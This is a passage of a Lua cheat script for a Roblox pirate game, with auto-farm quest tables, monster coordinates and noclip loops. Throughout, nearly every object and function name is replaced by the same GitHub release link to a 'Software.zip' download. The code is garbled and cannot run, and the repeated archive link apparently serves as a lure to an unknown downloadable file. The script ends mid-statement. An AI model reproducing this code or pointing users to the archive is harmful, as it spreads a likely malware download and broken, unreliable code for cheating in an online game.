        elseif Lv == 1250 or Lv <= 1274 or SelectMonster == "Ship Deckhand [Lv. 1250]" then -- Ship Deckhand
            Ms = "Ship Deckhand [Lv. 1250]"
            NameQuest = "ShipQuest1"
            QuestLv = 1
            NameMon = "Ship Deckhand"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1040.2927246094, 125.08293151855, 32911.0390625)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(921.12365722656, 125.9839553833, 33088.328125)
			if Auto_Farm and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude > 20000 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("requestEntrance",https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(923.21252441406, 126.9760055542, 32852.83203125))
			end
        elseif Lv == 1275 or Lv <= 1299 or SelectMonster == "Ship Engineer [Lv. 1275]" then -- Ship Engineer
            Ms = "Ship Engineer [Lv. 1275]"
            NameQuest = "ShipQuest1"
            QuestLv = 2
            NameMon = "Ship Engineer"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1040.2927246094, 125.08293151855, 32911.0390625)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(886.28179931641, 40.47790145874, 32800.83203125)
			if Auto_Farm and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude > 20000 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("requestEntrance",https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(923.21252441406, 126.9760055542, 32852.83203125))
			end
        elseif Lv == 1300 or Lv <= 1324 or SelectMonster == "Ship Steward [Lv. 1300]" then -- Ship Steward
            Ms = "Ship Steward [Lv. 1300]"
            NameQuest = "ShipQuest2"
            QuestLv = 1
            NameMon = "Ship Steward"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(971.42065429688, 125.08293151855, 33245.54296875)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(943.85504150391, 129.58183288574, 33444.3671875)
			if Auto_Farm and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude > 20000 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("requestEntrance",https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(923.21252441406, 126.9760055542, 32852.83203125))
			end
        elseif Lv == 1325 or Lv <= 1349 or SelectMonster == "Ship Officer [Lv. 1325]" then -- Ship Officer
            Ms = "Ship Officer [Lv. 1325]"
            NameQuest = "ShipQuest2"
            QuestLv = 2
            NameMon = "Ship Officer"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(971.42065429688, 125.08293151855, 33245.54296875)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(955.38458251953, 181.08335876465, 33331.890625)
			if Auto_Farm and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude > 20000 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("requestEntrance",https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(923.21252441406, 126.9760055542, 32852.83203125))
			end
        elseif Lv == 1350 or Lv <= 1374 or SelectMonster == "Arctic Warrior [Lv. 1350]" then -- Arctic Warrior
            Ms = "Arctic Warrior [Lv. 1350]"
            NameQuest = "FrostQuest"
            QuestLv = 1
            NameMon = "Arctic Warrior"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5668.1372070313, 28.202531814575, -6484.6005859375)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5935.4541015625, 77.26016998291, -6472.7568359375)
			if Auto_Farm and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude > 20000 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("requestEntrance",https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-6508.5581054688, 89.034996032715, -132.83953857422))
			end
        elseif Lv == 1375 or Lv <= 1424 or SelectMonster == "Snow Lurker [Lv. 1375]" then -- Snow Lurker
            Ms = "Snow Lurker [Lv. 1375]"
            NameQuest = "FrostQuest"
            QuestLv = 2
            NameMon = "Snow Lurker"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5668.1372070313, 28.202531814575, -6484.6005859375)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5628.482421875, 57.574996948242, -6618.3481445313)
        elseif Lv == 1425 or Lv <= 1449 or SelectMonster == "Sea Soldier [Lv. 1425]" then -- Sea Soldier
            Ms = "Sea Soldier [Lv. 1425]"
            NameQuest = "ForgottenQuest"
            QuestLv = 1
            NameMon = "Sea Soldier"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-3054.5827636719, 236.87213134766, -10147.790039063)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-3185.0153808594, 58.789089202881, -9663.6064453125)
        elseif Lv >= 1450 or SelectMonster == "Water Fighter [Lv. 1450]" then -- Water Fighter
            Ms = "Water Fighter [Lv. 1450]"
            NameQuest = "ForgottenQuest"
            QuestLv = 2
            NameMon = "Water Fighter"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-3054.5827636719, 236.87213134766, -10147.790039063)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-3262.9301757813, 298.69036865234, -10552.529296875)
		end
	end
	if ThreeWorld then
		if Lv == 1500 or Lv <= 1524 or SelectMonster == "Pirate Millionaire [Lv. 1500]" then -- Pirate Millionaire
			Ms = "Pirate Millionaire [Lv. 1500]"
			NameQuest = "PiratePortQuest"
			QuestLv = 1
			NameMon = "Pirate Millionaire"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-289.61752319336, 43.819011688232, 5580.0903320313)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-435.68109130859, 189.69866943359, 5551.0756835938)
		elseif Lv == 1525 or Lv <= 1574 or SelectMonster == "Pistol Billionaire [Lv. 1525]" then -- Pistol Billoonaire
			Ms = "Pistol Billionaire [Lv. 1525]"
			NameQuest = "PiratePortQuest"
			QuestLv = 2
			NameMon = "Pistol Billionaire"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-289.61752319336, 43.819011688232, 5580.0903320313)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-236.53652954102, 217.46676635742, 6006.0883789063)
		elseif Lv == 1575 or Lv <= 1599 or SelectMonster == "Dragon Crew Warrior [Lv. 1575]" then -- Dragon Crew Warrior
			Ms = "Dragon Crew Warrior [Lv. 1575]"
			NameQuest = "AmazonQuest"
			QuestLv = 1
			NameMon = "Dragon Crew Warrior"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5833.1147460938, 51.60498046875, -1103.0693359375)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(6301.9975585938, 104.77153015137, -1082.6075439453)
		elseif Lv == 1600 or Lv <= 1624 or SelectMonster == "Dragon Crew Archer [Lv. 1600]" then -- Dragon Crew Archer
			Ms = "Dragon Crew Archer [Lv. 1600]"
			NameQuest = "AmazonQuest"
			QuestLv = 2
			NameMon = "Dragon Crew Archer"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5833.1147460938, 51.60498046875, -1103.0693359375)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(6831.1171875, 441.76708984375, 446.58615112305)
		elseif Lv == 1625 or Lv <= 1649 or SelectMonster == "Female Islander [Lv. 1625]" then -- Female Islander
			Ms = "Female Islander [Lv. 1625]"
			NameQuest = "AmazonQuest2"
			QuestLv = 1
			NameMon = "Female Islander"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5446.8793945313, 601.62945556641, 749.45672607422)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5792.5166015625, 848.14392089844, 1084.1818847656)
		elseif Lv == 1650 or Lv <= 1699 or SelectMonster == "Giant Islander [Lv. 1650]" then -- Giant Islander
			Ms = "Giant Islander [Lv. 1650]"
			NameQuest = "AmazonQuest2"
			QuestLv = 2
			NameMon = "Giant Islander"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5446.8793945313, 601.62945556641, 749.45672607422)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5009.5068359375, 664.11071777344, -40.960144042969)
		elseif Lv == 1700 or Lv <= 1724 or SelectMonster == "Marine Commodore [Lv. 1700]" then -- Marine Commodore
			Ms = "Marine Commodore [Lv. 1700]"
			NameQuest = "MarineTreeIsland"
			QuestLv = 1
			NameMon = "Marine Commodore"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(2179.98828125, 28.731239318848, -6740.0551757813)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(2198.0063476563, 128.71075439453, -7109.5043945313)
		elseif Lv == 1725 or Lv <= 1774 or SelectMonster == "Marine Rear Admiral [Lv. 1725]" then -- Marine Rear Admiral
			Ms = "Marine Rear Admiral [Lv. 1725]"
			NameQuest = "MarineTreeIsland"
			QuestLv = 2
			NameMon = "Marine Rear Admiral"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(2179.98828125, 28.731239318848, -6740.0551757813)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(3294.3142089844, 385.41125488281, -7048.6342773438)
		elseif Lv == 1775 or Lv <= 1799 or SelectMonster == "Fishman Raider [Lv. 1775]" then -- Fishman Raide
			Ms = "Fishman Raider [Lv. 1775]"
			NameQuest = "DeepForestIsland3"
			QuestLv = 1
			NameMon = "Fishman Raider"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10582.759765625, 331.78845214844, -8757.666015625)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10553.268554688, 521.38439941406, -8176.9458007813)
		elseif Lv == 1800 or Lv <= 1824 or SelectMonster == "Fishman Captain [Lv. 1800]" then -- Fishman Captain
			Ms = "Fishman Captain [Lv. 1800]"
			NameQuest = "DeepForestIsland3"
			QuestLv = 2
			NameMon = "Fishman Captain"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10583.099609375, 331.78845214844, -8759.4638671875)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10789.401367188, 427.18637084961, -9131.4423828125)
		elseif Lv == 1825 or Lv <= 1849 or SelectMonster == "Forest Pirate [Lv. 1825]" then -- Forest Pirate
			Ms = "Forest Pirate [Lv. 1825]"
			NameQuest = "DeepForestIsland"
			QuestLv = 1
			NameMon = "Forest Pirate"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13232.662109375, 332.40396118164, -7626.4819335938)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13489.397460938, 400.30349731445, -7770.251953125)
		elseif Lv == 1850 or Lv <= 1899 or SelectMonster == "Mythological Pirate [Lv. 1850]" then -- Mythological Pirate
			Ms = "Mythological Pirate [Lv. 1850]"
			NameQuest = "DeepForestIsland"
			QuestLv = 2
			NameMon = "Mythological Pirate"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13232.662109375, 332.40396118164, -7626.4819335938)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13508.616210938, 582.46228027344, -6985.3037109375)
		elseif Lv == 1900 or Lv <= 1924 or SelectMonster == "Jungle Pirate [Lv. 1900]" then -- Jungle Pirate
			Ms = "Jungle Pirate [Lv. 1900]"
			NameQuest = "DeepForestIsland2"
			QuestLv = 1
			NameMon = "Jungle Pirate"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-12682.096679688, 390.88653564453, -9902.1240234375)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-12267.103515625, 459.75262451172, -10277.200195313)
		elseif Lv == 1925 or Lv <= 1974 or SelectMonster == "Musketeer Pirate [Lv. 1925]" then -- Musketeer Pirate
			Ms = "Musketeer Pirate [Lv. 1925]"
			NameQuest = "DeepForestIsland2"
			QuestLv = 2
			NameMon = "Musketeer Pirate"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-12682.096679688, 390.88653564453, -9902.1240234375)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13291.5078125, 520.47338867188, -9904.638671875)
		elseif Lv == 1975 or Lv <= 1999 or SelectMonster == "Reborn Skeleton [Lv. 1975]" then
			Ms = "Reborn Skeleton [Lv. 1975]"
			NameQuest = "HauntedQuest1"
			QuestLv = 1
			NameMon = "Reborn Skeleton"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9480.80762, 142.130661, 5566.37305, -0.00655503059, 4.52954225e-08, -0.999978542, 2.04920472e-08, 1, 4.51620679e-08, 0.999978542, -2.01955679e-08, -0.00655503059)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-8761.77148, 183.431747, 6168.33301, 0.978073597, -1.3950732e-05, -0.208259016, -1.08073925e-06, 1, -7.20630269e-05, 0.208259016, 7.07080399e-05, 0.978073597)
		elseif Lv == 2000 or Lv <= 2024 or SelectMonster == "Living Zombie [Lv. 2000]" then
			Ms = "Living Zombie [Lv. 2000]"
			NameQuest = "HauntedQuest1"
			QuestLv = 2
			NameMon = "Living Zombie"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9480.80762, 142.130661, 5566.37305, -0.00655503059, 4.52954225e-08, -0.999978542, 2.04920472e-08, 1, 4.51620679e-08, 0.999978542, -2.01955679e-08, -0.00655503059)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10103.7529, 238.565979, 6179.75977, 0.999474227, 2.77547141e-08, 0.0324240364, -2.58006327e-08, 1, -6.06848474e-08, -0.0324240364, 5.98163865e-08, 0.999474227)
		elseif Lv == 2025 or Lv <= 2049 or SelectMonster == "Demonic Soul [Lv. 2025]" then
			Ms = "Demonic Soul [Lv. 2025]"
			NameQuest = "HauntedQuest2"
			QuestLv = 1
			NameMon = "Demonic Soul"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9515.39551, 172.266037, 6078.89746, 0.0121199936, -9.78649624e-08, 0.999926567, 2.30358754e-08, 1, 9.75929382e-08, -0.999926567, 2.18513581e-08, 0.0121199936)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9709.30762, 204.695892, 6044.04688, -0.845798075, -3.4587876e-07, -0.533503294, -4.46235369e-08, 1, -5.77571257e-07, 0.533503294, -4.64701827e-07, -0.845798075)
		elseif Lv == 2050 or Lv <= 2074 or SelectMonster == "Posessed Mummy [Lv. 2050]" then
			Ms = "Posessed Mummy [Lv. 2050]"
			NameQuest = "HauntedQuest2"
			QuestLv = 2
			NameMon = "Posessed Mummy"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9515.39551, 172.266037, 6078.89746, 0.0121199936, -9.78649624e-08, 0.999926567, 2.30358754e-08, 1, 9.75929382e-08, -0.999926567, 2.18513581e-08, 0.0121199936)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9554.11035, 65.6141663, 6041.73584, -0.877069294, 5.33355795e-08, -0.480364174, 2.06420765e-08, 1, 7.33423562e-08, 0.480364174, 5.44105987e-08, -0.877069294)
        elseif Lv == 2075 or Lv <= 2099 or SelectMonster == "Peanut Scout [Lv. 2075]" then
			Ms = "Peanut Scout [Lv. 2075]"
			NameQuest = "NutsIslandQuest"
			QuestLv = 1
			NameMon = "Peanut Scout"
			CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2105.53198, 37.2495995, -10195.5088, -0.766061664, 0, -0.642767608, 0, 1, 0, 0.642767608, 0, -0.766061664)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2262.80298, 84.4387054, -10255.4922, -0.999993503, 4.39228813e-08, 0.00361041375, 4.39404282e-08, 1, 4.78073403e-09, -0.00361041375, 4.93934582e-09, -0.999993503)
        elseif Lv == 2100 or Lv <= 2124 or SelectMonster == "Peanut President [Lv. 2100]" then
			Ms = "Peanut President [Lv. 2100]"
			NameQuest = "NutsIslandQuest"
			QuestLv = 2
			NameMon = "Peanut President"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2104.61475, 38.1299706, -10194.1787, 0.767064989, -6.67286102e-08, 0.641569376, 3.32893402e-09, 1, 1.00028309e-07, -0.641569376, -7.4592478e-08, 0.767064989)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2182.97241, 88.2648697, -10552.2607, 0.881975889, -1.15795429e-09, 0.471294552, 1.33532996e-09, 1, -4.19579094e-11, -0.471294552, 6.66339595e-10, 0.881975889)
        elseif Lv == 2125 or Lv <= 2149 or SelectMonster == "Ice Cream Chef [Lv. 2125]" then
            Ms = "Ice Cream Chef [Lv. 2125]"
            NameQuest = "IceCreamIslandQuest"
            QuestLv = 1
            NameMon = "Ice Cream Chef"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-820.450378, 65.8453293, -10966.0752, 0.766577005, 3.68559938e-08, -0.642152369, 1.27155431e-09, 1, 5.89124021e-08, 0.642152369, -4.59774228e-08, 0.766577005)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-794.760315, 133.070297, -10952.6885, -0.788999617, -7.32182599e-08, 0.614393711, -9.73502026e-08, 1, -5.84480642e-09, -0.614393711, -6.4422899e-08, -0.788999617)
        elseif Lv == 2150 or Lv <= 2199 or SelectMonster == "Ice Cream Commander [Lv. 2150]" then
            Ms = "Ice Cream Commander [Lv. 2150]"
            NameQuest = "IceCreamIslandQuest"
            QuestLv = 2
            NameMon = "Ice Cream Commander"
            CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-820.450378, 65.8453293, -10966.0752, 0.766577005, 3.68559938e-08, -0.642152369, 1.27155431e-09, 1, 5.89124021e-08, 0.642152369, -4.59774228e-08, 0.766577005)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-655.430725, 126.896965, -11221.2744, 0.978674889, -1.0593471e-08, -0.205415353, 1.49809232e-08, 1, 1.98036911e-08, 0.205415353, -2.24586856e-08, 0.978674889)
        elseif Lv == 2200 or Lv <= 2224 or SelectMonster == "Cookie Crafter [Lv. 2200]" then
                Ms = "Cookie Crafter [Lv. 2200]"
                NameQuest = "CakeQuest1" 
                QuestLv = 1
                NameMon = "Cookie Crafter"
                CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2021.96851, 37.7982178, -12026.5137, 0.971608818, 1.80562854e-08, 0.236593053, -1.95491463e-08, 1, 3.96393229e-09, -0.236593053, -8.47658388e-09, 0.971608818)
                CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2276.00415, 146.539841, -12203.0146, -0.638633609, -1.0404194e-08, 0.769510984, 1.24565211e-08, 1, 2.38584601e-08, -0.769510984, 2.48222438e-08, -0.638633609)
            elseif Lv >= 2225 and Lv <= 2249 or SelectMonster == "Cake Guard [Lv. 2225]" then
                Ms = "Cake Guard [Lv. 2225]"
                NameQuest = "CakeQuest1" 
                QuestLv = 2
                NameMon = "Cake Guard"
                CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2021.4884, 37.7982292, -12026.9375, 0.934181511, -2.17844871e-08, 0.356799245, 4.77947726e-09, 0.99999994, 4.85416081e-08, -0.356799245, -4.36413572e-08, 0.934181511)
                CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1520.92725, 195.658432, -12300.3184, -0.830619276, 8.0356088e-08, -0.556840897, -1.90049647e-08, 1, 1.72656073e-07, 0.556840897, 1.53994222e-07, -0.830619276)
            elseif Lv >= 2250  and Lv <= 2274 or SelectMonster == "Baking Staff [Lv. 2250]" then
                Ms = "Baking Staff [Lv. 2250]"
                NameQuest = "CakeQuest2"
                QuestLv = 1
                NameMon = "Baking Staff"
                CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1927.58313, 37.7981453, -12843.8145, -0.961271644, -8.12611574e-07, 0.275603265, -7.71673683e-07, 1, 2.56976563e-07, -0.275603265, 3.43484281e-08, -0.961271644)
                CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1917.79016, 157.941437, -12869.1377, 0.697629273, -8.53369329e-06, -0.716459036, 1.89624473e-06, 1, -1.00645202e-05, 0.716459036, 5.66272183e-06, 0.697629273)
            elseif Lv >= 2275 or SelectMonster == "Head Baker [Lv. 2275]" then
                Ms = "Head Baker [Lv. 2275]"
                NameQuest = "CakeQuest2"
                QuestLv = 2
                NameMon = "Head Baker"
                CFrameQ = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1927.58313, 37.7981453, -12843.8145, -0.961271644, -8.12611574e-07, 0.275603265, -7.71673683e-07, 1, 2.56976563e-07, -0.275603265, 3.43484281e-08, -0.961271644)
                CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2259.45142, 152.333252, -12800.2656, -0.261799961, -4.23144547e-06, 0.965122163, -1.22252038e-06, 1, 4.05274068e-06, -0.965122163, -1.18874169e-07, -0.261799961)
            end
        end
    end

    
spawn(function()
    pcall(function()
        while https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip() do
            if Clip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or AutoKaitan then
                if not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BodyClip") then
                    local Noclip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BodyVelocity")
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "BodyClip"
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(150000,150000,150000)
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0,0,0)
                end
            elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false then
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BodyClip") then
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()
                end
            end 
        end
    end)
end)
 
spawn(function()
    pcall(function()
        game:GetService("RunService").Stepped:Connect(function()
            if Clip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or AutoKaitan then
                for _, v in pairs(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()) do
                    if v:IsA("BasePart") then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false    
                    end
                end
            end
        end)
    end)
end)

spawn(function()
    pcall(function()
        game:GetService("RunService").Heartbeat:Connect(function()
            if Noclip then
				if not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BodyClip") then
                    local Noclip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BodyVelocity")
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "BodyClip"
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(150000,150000,150000)
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0,0,0)
             while true do 
                 wait(0.1) 
                 game:GetService('TweenService'):Create(
                     Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                 {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 0, 0)}):Play() 
                 wait(.5)
 
                 game:GetService('TweenService'):Create(
                     Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                 {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 155, 0)}):Play() 
                 wait(.5)
 
                 game:GetService('TweenService'):Create(
                     Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                 {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 0)}):Play() 
                 wait(.5)
 
                 game:GetService('TweenService'):Create(
                     Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                 {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 255, 0)}):Play() 
                 wait(.5)
 
                 game:GetService('TweenService'):Create(
